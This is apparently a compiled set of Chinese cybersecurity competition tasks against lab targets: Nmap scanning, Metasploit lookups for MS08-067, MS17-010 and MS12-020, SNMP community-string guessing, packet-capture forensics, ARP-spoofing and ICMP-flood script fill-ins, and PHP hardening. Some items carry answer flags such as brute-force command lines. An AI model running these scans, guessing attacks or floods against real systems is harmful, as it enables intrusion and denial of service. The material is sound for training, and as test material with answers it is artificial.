![截图.png](    赛题环境解析/media/image271.png){width="5.472222222222222in"
height="2.7830161854768156in"}

5. 
通过本地PC中渗透测试平台Kali对服务器场景PYsystemZJW进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为FLAG提交；

![截图.png](    赛题环境解析/media/image272.png){width="5.760416666666667in"
height="5.679387576552931in"}

6. 
通过本地PC中渗透测试平台Kali对服务器场景PYsystemZJW进行渗透测试，将该场景中的当前最高账户管理员的密码作为FLAG提交；

![截图.png](    赛题环境解析/media/image273.png){width="4.083333333333333in"
height="1.9791666666666667in"}

7. 
通过本地PC中渗透测试平台Kali对服务器场景PYsystemZJW进行渗透测试，将该场景中回收站内文件的文档内容作为FLAG提交。(文件比较多要一个一个打开)

![截图.png](    赛题环境解析/media/image274.png){width="2.4166666666666665in"
height="0.96875in"}

**任务三：数据分析数字取证-Bravo-1**

**任务环境说明：**

ü 渗透机场景：Windows 7

ü 渗透机场景用户名：administrator,密码：123456

1. 分析Windows
7桌面下的Bravo-1.pcapng数据包文件，通过分析数据包Bravo-1.pcapng找出恶意用户目录扫描的第2个目录名，并将该目录名作为FLAG提交：

2. 继续查看数据包文件Bravo-1.pcapng，分析出恶意用户通过哪个目录写入的一句话木马，并将该目录名作为FLAG提交：

3. 继续查看数据包文件Bravo-1.pcapng分析出恶意用户读取了服务器什么文件，并将该文件名及后缀作为FLAG提交：

4. 继续查看数据包文件Bravo-1.pcapng分析出恶意用户写入一句话木马的路径是什么，并将该路径作为FLAG提交：

5. 继续查看数据包文件Bravo-1.pcapng分析出恶意用户连接一句话木马的密码是什么，并将一句话密码作为FLAG提交：

6. 继续查看数据包文件Bravo-1.pcapng分析出恶意用户下载了什么文件，并将文件名及后缀作为FLAG提交：

7. 继续查看数据包文件Bravo-1.pcapng将Web服务器连接的数据库名作为FLAG提交：

**任务二：Linux操作系统渗透测试 (后门漏洞)**

**任务环境说明：**

ü 服务器场景：Linux

ü 服务器场景操作系统：Linux（版本不详）

ü 渗透机场景：kali

ü 渗透机用户名：root，密码：toor

1. 通过本地PC中渗透测试平台Kali对服务器场景Linux进行操作系统扫描渗透测试，并将该操作显示结果"OS
Details："之后的字符串作为FLAG提交；

![截图.png](    赛题环境解析/media/image275.png){width="5.760416666666667in"
height="3.671017060367454in"}

2. 通过本地PC中渗透测试平台Kali对服务器场景Linux进行系统服务及版本扫描渗透测试，并将该操作显示结果中MySQL数据库对应的服务版本信息字符串作为FLAG提交；

![截图.png](    赛题环境解析/media/image276.png){width="5.760416666666667in"
height="3.0425273403324584in"}

3. 通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件名称作为FLAG提交；

![截图.png](    赛题环境解析/media/image277.png){width="5.760416666666667in"
height="4.481461067366579in"}

4. 通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件内容作为FLAG提交；

5. 通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp文件的文件名称作为FLAG提交；

6. 通过本地PC中渗透测试平台Kali对服务器场景Linux进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp的图片文件中的英文单词作为FLAG提交。

**[任务四：漏洞扫描与利用]{.mark}**

**[任务环境说明：]{.mark}**

[· 服务器场景名：Jtest]{.mark}

[· 服务器场景操作系统：Microsoft Windows2003 Server]{.mark}

[· 服务器场景用户名：（用户名：administrator；密码：空）]{.mark}

[1. 通过本地PC中渗透测试平台Kali对服务器场景server2003以半开放式不进行ping的扫描方式并配合a，要求扫描信息输出格式为xml文件格式，从生成扫描结果获取局域网（例如172.16.101.0/24）中存活靶机，以xml格式向指定文件输出信息（使用工具NMAP，使用必须要使用的参数），并将该操作使用命令中必须要使用的参数作为FLAG提交（各参数之间用英文逗号分割，例a,b,c,d）；]{.mark}

![截图.png](    赛题环境解析/media/image278.png){width="5.760416666666667in"
height="3.072599518810149in"}

[2. 根据第一题扫描的回显信息分析靶机操作系统版本信息，将操作系统版本信息作为FLAG提交；]{.mark}

![截图.png](    赛题环境解析/media/image279.png){width="5.760416666666667in"
height="0.22473862642169729in"}

[3. 根据第一题扫描的回显信息分析靶机服务开放端口，分析开放的服务，并将共享服务的开放状态作为FLAG提交；]{.mark}

![截图.png](    赛题环境解析/media/image280.png){width="5.760416666666667in"
height="3.7499529746281715in"}

[4. 在本地PC的渗透测试平台Kali中，使用命令初始化msf数据库，并将使用的命令作为FLAG提交；]{.mark}

![截图.png](    赛题环境解析/media/image281.png){width="5.760416666666667in"
height="3.18298009623797in"}

[5. 在本地PC的渗透测试平台Kali中，打开msf，使用db_import将扫描结果导入到数据库中，并查看导入的数据，将查看导入的数据要使用的命令作为FLAG提交；]{.mark}

[flag:hosts]{.mark}

[6. 在msfconsole使用search命令搜索MS08067漏洞攻击程序，并将回显结果中的漏洞时间作为FLAG提交；]{.mark}

![截图.png](    赛题环境解析/media/image282.png){width="5.760416666666667in"
height="0.9684765966754155in"}

[7. 在msfconsole中利用MS08067漏洞攻击模块，将调用此模块的命令作为FLAG提交；]{.mark}

![截图.png](    赛题环境解析/media/image283.png){width="5.760416666666667in"
height="0.1925721784776903in"}

[8. 在上一步的基础上查看需要设置的选项，并将回显中需设置的选项名作为FLAG提交；]{.mark}

![截图.png](    赛题环境解析/media/image284.png){width="5.760416666666667in"
height="2.824099956255468in"}

[9. 使用set命令设置目标IP（在第8步的基础上），并检测漏洞是否存在，将回显结果中最后四个单词作为FLAG提交；]{.mark}

![截图.png](    赛题环境解析/media/image285.png){width="5.760416666666667in"
height="0.5451038932633421in"}

[10. 查看可选项中存在此漏洞的系统版本，判断该靶机是否有此漏洞，若有，将存在此漏洞的系统版本序号作为FLAG提交，否则FLAG为none。]{.mark}

**B-7：渗透测试**

**任务环境说明：**

ü  服务器场景：Server09 

ü  服务器场景操作系统：未知（关闭连接）

ü  系统用户名：administrator密码：123456

1.  
通过本地PC中渗透测试平台Kali对靶机场景进行系统服务及版本扫描渗透测试，以xml格式向指定文件输出信息（使用工具Nmap），将以xml格式向指定文件输出信息必须要使用的参数作为Flag值提交；

2.  
在本地PC的渗透测试平台Kali中，使用命令初始化MSF数据库并将此命令作为Flag值提交；

3.  
在本地PC的渗透测试平台Kali中，打开MSF，使用db_import将扫描结果导入到数据库中，并查看导入的数据，将查看该数据要使用的命令作为Flag值提交；

4.  
在MSF工具中用search命令搜索MS17010漏洞利用模块，将回显结果中的漏洞公开时间作为Flag值提交；（如：2017-10-16）

5.  
在MSF工具中调用MS17010漏洞攻击模块，并检测靶机是否存在漏洞，将回显结果中最后一个单词作为Flag值提交。

**任务环境说明：**

ü 服务器场景：PYsystemWH1

ü 服务器场景操作系统：Windows（版本不详）

1.通过本地PC中渗透测试平台Kali2.0对服务器场景PYsystemWH1进行系统服务及版本扫描渗透测试，并将该操作显示结果中3389端口的服务状态信息作为Flag值提交；

2.在msfconsole中用search命令搜索MS12020RDP拒绝访问攻击模块，并将回显结果中的漏洞披露时间作为Flag值（如：2012-10-16）提交；

3在msfconsole中利用MS12020RDP拒绝访问漏洞辅助扫描模块，将调用此模块的命令作为Flag值提交；

4.在第3题的基础上查看需要配置的选项，并将回显中必须要设置的选项名作为Flag值提交；

5.使用set命令设置目标IP（在第4题的基础上），并检测漏洞是否存在，运行此模块将回显结果中倒数第二行最后一个单词作为Flag值提交；

6.在msfconsole中利用MS12010RDP拒绝访问攻击模块，将调用此模块的命令作为Flag值提交；

7.使用set命令设置目标IP（在第6题的基础上）使用MS12020拒绝访问攻击模块，运行此模块将回显结果中倒数第一行的最后一个单词作为Flag值提交；

8.进入靶机关闭远程桌面服务，再次运行MS12020拒绝访问攻击模块，运行此模块将回显结果中倒数第二行的最后一个单词作为Flag值提交；

**任务2. 主机发现与信息收集（100分）**

**任务环境说明：**

ü 服务器场景：Jtest（用户名：administrator；密码：空）

ü 服务器场景操作系统：Windows server2003

1. 通过本地PC中渗透测试平台BT5使用fping对服务器场景server2003所在网段(例如：172.16.101.0/24)进行主机发现扫描,并将该操作使用的命令中必须要使用的参数作为FLAG提交；（12分）

2. Flag:g

3. 通过本地PC中渗透测试平台BT5使用genlist对服务器场景server2003所在网段进行扫描进行主机存活发现,
并将该操作使用的命令中必须要使用的参数作为FLAG提交；（12分）

4. Flag:s

3. 在通过本地PC中渗透测试平台BT5使用nbtscan对服务器场景server2003所在网段进搜索扫描，获取目标的MAC地址等信息，并将该操作使用的命令中必须要使用的参数作为FLAG提交；（12分）

4. Flag:r

5. 假设服务器场景server2003设置了防火墙无法进行ping检测，通过PC中渗透测试平台BT5使用arping检测主机连通性扫描（发送请求数据包数量为4个），并将该操作使用的命令中固定不变的字符串作为FLAG提交；（12分）

6. Flag:arping -c 4

5. 通过本地PC中渗透测试平台BT5使用fping对服务器场景server2003所在网段进行存活性扫描，且要把最终扫描的存活主机输出到文件ip.txt中，并将该操作使用的命令中必须要使用的参数作为FLAG提交（各参数之间用英文逗号分割，例a,b）；（12分）

6. Flag: g,a

7. 通过本地PC中渗透测试平台BT5使用nbtscan从第5题的ip.txt文件中读取IP扫描主机信息MAC地址等信息，并将该操作使用的命令中固定不变的字符串作为FLAG提交；（12分）

8. Flag:-f

7. 通过本地PC中渗透测试平台BT5使用xprobe2对服务器场景server2003进行TCP扫描，仅扫描靶机80,3306端口的开放情况(端口之间以英文格式下逗号分隔)，并将该操作使用的命令中固定不变的字符串作为FLAG提交；（12分）,

8. Flag:xprobe2 -T80,3306

9. 通过本地PC中渗透测试平台BT5使用xprobe2对服务器场景server2003进行UDP扫描，仅扫描靶机161,162端口的开放情况(端口之间以英文格式下逗号分隔)，并将该操作使用的命令中固定不变的字符串作为FLAG提交。（16分）flag:xprobe2
-U161,162

**任务3. SNMP信息收集与利用（100分）**

**任务环境说明：**

ü 服务器场景：Jtest（用户名：administrator；密码：空）

ü 服务器场景操作系统：Windows server2003

1.在本地PC渗透测试平台BT5中使用autoscan工具扫描服务器场景server2003所在网段(例如：172.16.101.0/24)范围内存活的主机地址。判断存活主机是否开放网络管理服务，若开启则以扫描出开启SNMP服务的主机名作为FLAG提交；（11分）

2.在本地PC渗透测试平台BT5中使用nmap工具进行UDP扫描服务器场景server2003所在网段范围内存活的主机地址，判断网络管理服务的开放情况，若开启，则以扫描出SNMP开放的端口号作为FLAG（各端口之间用英文分号分割，例21;23），若未开放则提交none作为FLAG；（11分）

3.在本地PC渗透测试平台BT5中调用snmpwalk工具测试服务器场景server2003是否开启Windows
SNMP服务（共同体为默认字符串为public，通过对目标靶机的.1.3.6.1.2.1.25.1.6分支进行snmpwalk来测试服务的开放情况（SNMP
版本为v2c），并将该操作使用的命令中必须要使用的参数作为FLAG提交（各参数之间用英文分号分割，例a;b）；（11分）

Flag:v;c

4. 在本地PC渗透测试平台BT5中使用ADMsnmp工具尝试猜解团体字符串，并将使用的全部命令作为FLAG提交（提交答案时IP以192.168.100.10代替,使用默认字典snmp.passwd）；（11分）

5. Flag:./ADMsnmp 192.168.100.100 -wordlist snmp.passwd

6. 更换使用onesixtyone工具执行命令查看帮助选项，并将输入的命令作为FLAG提交；（11分）

7. Flag:./onesixtyone

3. 在本地PC渗透测试平台BT5中使用onesixtyone对靶机SNMP进行团体字符串猜解，并将使用的全部命令作为FLAG提交（提交的命令为忽略IP后必须使用的命令，字典名字为dict.txt）；（11分）

4. Flag:./onesixtyone -c dict.txt

8. 在本地PC渗透测试平台BT5中对猜解结果进行查看，将回显中猜解的团体字符串作为FLAG提交；（11分）

9. Flag:public

5. 在本地PC渗透测试平台BT5中选择新的SNMP攻击模块snmpcheck，根据得到的public团体字符串并利用snmpcheck进行对靶机的信息收集，并将该操作使用的命令中必须使用的参数作为FLAG提交；（11分）

6. Flag:t

9.查看获取的系统信息，将系统管理员用户和异常（黑客）用户作为FLAG提交，（各用户之间用英文分号分割，例root;user）。（12分）

**任务4. Windows操作系统渗透测试（100分）**

**任务环境说明：**

ü 服务器场景：PYsystem4

ü 服务器场景操作系统：Windows（版本不详）

1.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行操作系统扫描渗透测试，并将该操作显示结果"Running："之后的字符串作为FLAG提交；（6分）

2.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行系统服务及版本扫描渗透测试，并将该操作显示结果中445端口对应的服务版本信息字符串作为FLAG提交；（6分）

3.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行渗透测试，将该场景网络连接信息中的DNS信息作为FLAG提交;(例如114.114.114.114)（13分）

4.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文件名称作为FLAG提交；（14分）

5.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行渗透测试，将该场景桌面上111文件夹中唯一一个后缀为.docx文件的文档内容作为FLAG提交；（16分）

6.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行渗透测试，将该场景桌面上222文件夹中唯一一个图片中的英文单词作为FLAG提交；（15分）

7.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行渗透测试，将该场景中的当前最高账户管理员的密码作为FLAG提交；（10分）

8.通过本地PC中渗透测试平台Kali对服务器场景PYsystem4进行渗透测试，将该场景中回收站内文件的文档内容作为FLAG提交。（20分）

**任务5. Linux操作系统渗透测试（100分）**

**任务环境说明：**

ü 服务器场景：PYsystem5

ü 服务器场景操作系统：未知

1.通过本地PC中渗透测试平台Kali对服务器场景PYsystem5进行操作系统扫描渗透测试，并将该操作显示结果"OS
Details："之后的字符串作为FLAG提交；（6分）

2.通过本地PC中渗透测试平台Kali对服务器场景PYsystem5进行系统服务及版本扫描渗透测试，并将该操作显示结果中MySQL数据库对应的服务版本信息字符串作为FLAG提交；（6分）

3.通过本地PC中渗透测试平台Kali对服务器场景PYsystem5进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件名称作为FLAG提交；（12分）

4.通过本地PC中渗透测试平台Kali对服务器场景PYsystem5进行渗透测试，将该场景/var/www/html目录中唯一一个后缀为.html文件的文件内容作为FLAG提交；（16分）

5.通过本地PC中渗透测试平台Kali对服务器场景PYsystem5进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp文件的文件名称作为FLAG提交；（27分）

6.通过本地PC中渗透测试平台Kali对服务器场景PYsystem5进行渗透测试，将该场景/root目录中唯一一个后缀为.bmp的图片文件中的英文单词作为FLAG提交。（33分）

**B-1任务一：Web安全渗透测试（第一套）**

任务环境说明：

服务器场景：server1

服务器场景用户名、密码：未知（关闭链接）

1.通过URL访问http://靶机IP/1，对该页面进行渗透测试,将完成后返回的结果内容作为flag值提交；

2.通过URL访问http://靶机IP/2，对该页面进行渗透测试,将完成后返回的结果内容作为flag值提交；

3.通过URL访问http://靶机IP/3，对该页面进行渗透测试,将完成后返回的结果内容作为flag值提交；

4.通过URL访问http://靶机IP/4，对该页面进行渗透测试,将完成后返回的结果内容作为flag值提交；

5.通过URL访问http://靶机IP/5，对该页面进行渗透测试,将完成后返回的结果内容作为flag值提交。

**任务7. Web应用程序渗透测试及安全加固（100分）**

**任务环境说明：**

服务器场景：WindowsServer18065

服务器场景操作系统：Windows2003 Server

服务器场景FTP下载服务用户名：anonymous，密码：123456

服务器场景FTP下载服务端口：2121

服务器场景FTP上传服务用户名：anonymous，密码：123456

服务器场景FTP上传服务端口：21

1.在攻击机端通过浏览器访问主页http://靶机IP地址，通过Web应用程序渗透测试方法登陆磐石公司模拟产品网站，成功登陆后，将Web页面弹出的字符串通过SHA256运算后返回哈希值的十六进制结果的字符串作为Flag值提交；（7分）

2.从靶机服务器场景FTP服务器中下载文件loginauthentic.php，编辑该PHP程序文件，使该程序实现能够对本任务第1题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F11字符串，将该字符串作为Flag值提交；（7分）

3.继续编辑本任务第2题中的PHP程序文件，使该程序实现能够对本任务第1题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F12字符串，将该字符串作为Flag值提交；（7分）

4.继续编辑本任务第2题中的PHP程序文件，使该程序实现能够对本任务第1题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F13字符串，将该字符串作为Flag值提交；（7分）

5.继续编辑本任务第2题中的PHP程序文件，使该程序实现能够对本任务第1题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F14字符串，将该字符串作为Flag值提交；（7分）

6.继续编辑本任务第2题中的PHP程序文件，使该程序实现能够对本任务第1题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F15字符串，将该字符串作为Flag值提交；（7分）

7.将编辑好后的loginauthentic.php程序文件上传至靶机FTP服务，在攻击机端通过浏览器访问主页http://靶机IP地址，通过本任务第1题所使用的Web应用程序渗透测试方法登陆磐石公司模拟产品网站，将此时Web页面弹出的字符串通过SHA256运算后返回的哈希值的十六进制结果的字符串作为Flag值提交；（7分）

8.成功登陆磐石公司模拟产品网站后，继续点击超链接进入磐石公司产品信息页面，通过Web应用程序渗透测试方法获得靶机根路径下的文件flaginfo中的字符串，并将该字符串通过SHA256运算后返回哈希值的十六进制结果的字符串作为Flag值提交；（8分）

9.从靶机服务器场景FTP服务器中下载文件product.php，编辑该PHP程序文件，使该程序实现能够对本任务第8题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F16字符串，将该字符串作为Flag值提交；（7分）

10.继续编辑本任务第9题中的PHP程序文件，使该程序实现能够对本任务第8题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F17字符串，将该字符串作为Flag值提交；（7分）

11.继续编辑本任务第9题中的PHP程序文件，使该程序实现能够对本任务第8题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F18字符串，将该字符串作为Flag值提交；（7分）

12.继续编辑本任务第9题中的PHP程序文件，使该程序实现能够对本任务第8题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F19字符串，将该字符串作为Flag值提交；（7分）

13.继续编辑本任务第9题中的PHP程序文件，使该程序实现能够对本任务第8题中的Web应用程序渗透测试过程进行安全防护，填写该文件当中空缺的F20字符串，将该字符串作为Flag值提交；（7分）

14.将编辑好后的product.php程序文件上传至靶机FTP服务，并在攻击机端通过本任务第8题中使用的Web应用程序渗透测试方法获得靶机根路径下的文件flaginfo中的字符串，将此时Web页面弹出的字符串通过SHA256运算后返回的哈希值的十六进制结果的字符串作为Flag值提交。（8分）

**任务6. 网络协议堆栈渗透测试（100分）**

**任务环境说明：**

服务器场景：WindowsServer18065

服务器场景操作系统：Windows2003 Server

服务器场景FTP下载服务用户名：anonymous，密码：123456

服务器场景FTP下载服务端口：2121

1.通过物理机的ping程序访问靶机，成功访问后，在攻击机中使用arpspoof程序对物理机进行ARP渗透测试，对物理机进行ARP缓存毒化为：靶机IP地址映射攻击机MAC地址；从靶机服务器场景的FTP服务器中下载文件arpspoof.py，编辑该Python3程序文件，使该程序实现同本任务中arpspoof程序一致的功能，填写该文件当中空缺的F1字符串，将该字符串作为Flag值提交；（9分）

2.继续编辑该Python3程序文件，使该程序实现同本任务题1中arpspoof程序一致的功能，填写该文件当中空缺的F2字符串，将该字符串作为Flag值提交；（9分）

3.继续编辑该Python3程序文件，使该程序实现同本任务题1中arpspoof程序一致的功能，填写该文件当中空缺的F3字符串，将该字符串作为Flag值提交；（9分）

4.继续编辑该Python3程序文件，使该程序实现同本任务题1中arpspoof程序一致的功能，填写该文件当中空缺的F4字符串，将该字符串作为Flag值提交；（9分）

5.继续编辑该Python3程序文件，使该程序实现同本任务题1中arpspoof程序一致的功能，填写该文件当中空缺的F5字符串，将该字符串作为Flag值提交；（9分）

6.继续从靶机服务器场景FTP服务器中下载文件icmpflood.py，编辑该Python3程序文件，使该程序实现通过ICMP对物理机进行DOS（拒绝服务）渗透测试的功能，填写该文件当中空缺的F6字符串，将该字符串作为Flag值提交；（9分）

7.继续编辑命名为icmpflood.py的Python3程序文件，使该程序实现通过ICMP对物理机进行DOS（拒绝服务）渗透测试的功能，填写该文件当中空缺的F7字符串，将该字符串作为Flag值提交；（9分）

8.继续编辑命名为icmpflood.py的Python3程序文件，使该程序实现通过ICMP对物理机进行DOS（拒绝服务）渗透测试的功能，填写该文件当中空缺的F8字符串，将该字符串作为Flag值提交；（9分）

9.继续编辑命名为icmpflood.py的Python3程序文件，使该程序实现通过ICMP对物理机进行DOS（拒绝服务）渗透测试的功能，填写该文件当中空缺的F9字符串，将该字符串作为Flag值提交；（9分）

10.继续编辑命名为icmpflood.py的Python3程序文件，使该程序实现通过ICMP对物理机进行DOS（拒绝服务）渗透测试的功能，填写该文件当中空缺的F10字符串，将该字符串作为Flag值提交；（9分）

11\.
在本地PC渗透测试平台BT5中通过Python3程序解释器执行程序文件icmpflood.py，并打开WireShark监听网络流量，分析通过程序文件icmpflood.py产生的ICMP流量，并将该ICMP数据对象中的Code属性值通过MD5运算后返回的哈希值的十六进制结果的字符串作为Flag值提交。（10分）
